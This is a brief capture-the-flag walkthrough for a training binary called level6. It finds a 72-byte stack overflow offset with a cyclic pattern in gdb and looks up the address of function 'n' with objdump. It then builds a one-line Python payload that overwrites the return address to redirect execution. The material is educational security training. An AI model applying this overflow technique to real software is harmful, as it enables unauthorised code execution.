We start by opening the binary in [dogbolt](https://dogbolt.org/) here we see that we must call `n` to trigger the `cat`.

We search the offset using a pattern generator like : [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator)

```
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```

When we put 0x41346341 in wiremask it find an offset of 72.

We search `n`:

```Shell
objdump -t level6
...
08049824  w      .data  00000000              data_start
08048454 g     F .text  00000014              n
0804982c g       *ABS*  00000000              _edata
...
```

address of `n` : 08048454
little-endian : /x54/x84/x04/x08

Putting this together give us :
```Shell
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```
